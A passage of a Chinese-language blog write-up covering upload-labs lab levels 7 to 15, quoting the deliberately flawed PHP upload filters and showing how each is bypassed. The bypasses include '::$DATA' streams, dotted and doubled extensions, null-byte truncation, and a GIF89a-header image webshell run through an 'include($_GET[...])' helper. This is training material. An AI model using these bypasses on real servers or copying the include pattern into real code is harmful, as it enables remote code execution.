&#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在php后面加一个.</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407173907933.png" alt="image-20200407173907933"></p>
<p>上传，并查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174027297.png" alt="image-20200407174027297"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174059887.png" alt="image-20200407174059887"></p>
<h4 id="upload-labs第八关"><a href="#upload-labs第八关" class="headerlink" title="upload-labs第八关"></a>upload-labs第八关</h4><h5 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p>
<p>简单讲就是在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p><em>注:仅windows适用</em></p>
<h5 id="更改文件名"><a href="#更改文件名" class="headerlink" title="更改文件名"></a>更改文件名</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174419725.png" alt="image-20200407174419725"></p>
<p>上传</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200407174444629.png" alt="image-20200407174444629"></p>
<p>查看根目录</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200407174456829.png" alt="image-20200407174456829"></p>
<h4 id="upload-labs第九关"><a href="#upload-labs第九关" class="headerlink" title="upload-labs第九关"></a>upload-labs第九关</h4><h5 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。<strong>这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。</strong>都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code>，也是利用了Windows的特性。<br> 也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更改文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174734363.png" alt="image-20200407174734363"></p>
<p>上传，返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174757325.png" alt="image-20200407174757325"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407174807082.png" alt="image-20200407174807082"></p>
<h4 id="upload-labs第十关"><a href="#upload-labs第十关" class="headerlink" title="upload-labs第十关"></a>upload-labs第十关</h4><h5 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里代码没有了之前关卡里的去除文件尾点、空格、::$DATA的操作，估计是针对非Windows系统的。这里存在的问题是，利用str_ireplace对黑名单里的文件后缀名进行了替换，换成空字符，使用了str_ireplace函数，即不区分大小写，故大小写绕过不适用。但是这里替换是替换成了空字符，于是我们可以双写后缀名，如<code>.pphphp</code>,使得替换后的后缀名为php。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更改文件后缀名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407175030777.png" alt="image-20200407175030777"></p>
<p>上传文件，返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407175059266.png" alt="image-20200407175059266"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407175128156.png" alt="image-20200407175128156"></p>
<h4 id="upload-labs第十一关"><a href="#upload-labs第十一关" class="headerlink" title="upload-labs第十一关"></a>upload-labs第十一关</h4><h5 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。</p>
<p>0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符</p>
<p>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束</p>
<p>date()随机数和rand()时间，以及最后添加文件扩展名$file_ext，这样就可以在date(“YmdHis”)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">截断条件：</span><br><span class="line"> 1、php版本小于5.3.4</span><br><span class="line"> 2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<p>将其改为OFF状态</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407200436602.png" alt="image-20200407200436602"></p>
<p>首先新建一个1.php的文件，将其里面写入一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406081237206.png" alt="image-20200406083446465"></p>
<p>写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083134693.png" alt="image-20200406081237206"></p>
<p>进行上传，使用burp抓包，然后将burp中的信息进行稍微修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083446465.png" alt="image-20200406083134693"></p>
<p>修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083622923.png" alt="image-20200406083622923"></p>
<p>在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083751706.png" alt="image-20200406084954651"></p>
<p>删除之后在进入页面，返回phpinof的页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083843607.png" alt="image-20200406085245844"></p>
<p>这就是GTE截断。</p>
<h4 id="upload-labs第十二关"><a href="#upload-labs第十二关" class="headerlink" title="upload-labs第十二关"></a>upload-labs第十二关</h4><h5 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在POST请求中，%00不会被自动解码，需要在16进制中进行修改00</p>
<p>创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包</p>
<p>这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断</p>
<p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，利用原理也是00截断</p>
<p>为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406084954651.png" alt="image-20200406083751706"></p>
<p>在HEX子模块中找到1.php空格，找到20</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085245844.png" alt="image-20200406083843607"></p>
<p>找到20之后，要将他修改为00</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085344970.png" alt="image-20200406085759324"></p>
<p>修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085602285.png" alt="image-20200406085602285"></p>
<p>在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085759324.png" alt="image-20200406085344970"></p>
<p><strong>注意：</strong>截断需要关闭GPC否则会上传失败</p>
<h4 id="upload-labs第十三关"><a href="#upload-labs第十三关" class="headerlink" title="upload-labs第十三关"></a>upload-labs第十三关</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gif文件头表示GIF89a</span><br><span class="line"></span><br><span class="line">png文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0a</span><br><span class="line"></span><br><span class="line">jpg文件头标识 (2 bytes): ff, d8</span><br></pre></td></tr></table></figure>

<h5 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里代码意思是，将上传的文件读取先读取两字节，通过对比文件头来确认文件类型。<br> 于是就可以制作图片马，将php语句隐藏在图片中，然后结合文件包含漏洞执行php。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file &#x3D; fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    </span><br><span class="line">    $fileType &#x3D; &#39;&#39;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType &#x3D; &#39;jpg&#39;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType &#x3D; &#39;png&#39;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType &#x3D; &#39;gif&#39;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType &#x3D; &#39;unknown&#39;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $file_type &#x3D; getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这一关开始上传图片马，结合文件包含进行攻击。</p>
<p>查看提示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407210648001.png" alt="image-20200407210648001"></p>
<h5 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h5><ul>
<li>服务端检测文件头，并将上传文件的后缀重命名为检测到的文件类型</li>
<li>关于服务端检测文件头，我们可以在文件起始加入<code>jpg|png|gif</code>文件的文件头来绕过</li>
</ul>
<blockquote>
<p>十进制转十六进制: <code>gif</code>为47 49 ， <code>png</code>为89 50， <code>jpg</code>为ff d8</p>
</blockquote>
<ul>
<li>关于文件上传后被重命名为图片文件，不能当做<code>php</code>解析，我们可以利用文件包含漏洞</li>
</ul>
<p>这里使用GIF</p>
<ul>
<li>gif文件头为GIF89a</li>
</ul>
<p>构造代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211550062.png" alt="image-20200407211550062"></p>
<p>将php改为jpg或者gif等能上传的格式，这里改为png</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211632706.png" alt="image-20200407211632706"></p>
<p>上传图片，页面返回空白</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211720783.png" alt="image-20200407211720783"></p>
<p>直接复制图片地址是会出错的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407211800092.png" alt="image-20200407211800092"></p>
<p>所以需要使用到文件包含漏洞</p>
<p>在upload下新建一个php文件</p>
<p>写入简单的提交页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file&#x3D;$_GET[&#39;ccc&#39;];</span><br><span class="line">	include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407213647598.png" alt="image-20200407213647598"></p>
<p>返回页面，复制图片地址，因为我们之前新建的php文件是c.php，提交内容是ccc，所以在页面中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;c.php?ccc&#x3D;图片名称</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407213901204.png" alt="image-20200407213901204"></p>
<h4 id="upload-labs第十四关"><a href="#upload-labs第十四关" class="headerlink" title="upload-labs第十四关"></a>upload-labs第十四关</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">想要提交那种文件就将文件头标识放到php文本开头</span><br><span class="line"></span><br><span class="line">gif文件头表示GIF89a</span><br><span class="line"></span><br><span class="line">png文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0a</span><br><span class="line"></span><br><span class="line">jpg文件头标识 (2 bytes): ff, d8</span><br></pre></td></tr></table></figure>

<h5 id="查看提示"><a href="#查看提示" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407214334480.png" alt="image-20200407214334480"></p>
<h5 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h5><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
<p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types &#x3D; &#39;.jpeg|.png|.gif&#39;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info &#x3D; getimagesize($filename);</span><br><span class="line">        $ext &#x3D; image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">    $res &#x3D; isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg &#x3D; &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="和上一关相同，只是函数换了一个"><a href="#和上一关相同，只是函数换了一个" class="headerlink" title="和上一关相同，只是函数换了一个"></a>和上一关相同，只是函数换了一个</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407214613459.png" alt="image-20200407214613459"></p>
<h4 id="upload-labs第十五关"><a href="#upload-labs第十五关" class="headerlink" title="upload-labs第十五关"></a>upload-labs第十五关</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">想要提交那种文件就将文件头标识放到php文本开头</span><br><span class="line"></span><br><span class="line">gif文件头表示GIF89a</span><br><span class="line"></span><br><span class="line">png文件头标识 (8 bytes) 89 50 4e 47 0d 0a 1a 0a</span><br><span class="line"></span><br><span class="line">jpg文件头标识 (2 bytes): ff, d8</span><br></pre></td></tr></table></figure>

<h5 id="查看提示-1"><a href="#查看提示-1" class="headerlink" title="查看提示"></a>查看提示</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407215126253.png" alt="image-20200407215126253"></p>
<h5 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h5><p>这里使用了<code>exif_imagetype()</code>函数</p>
<p><code>exif_imagetype()</code>函数是php内置函数，用来获取图片类型</p>
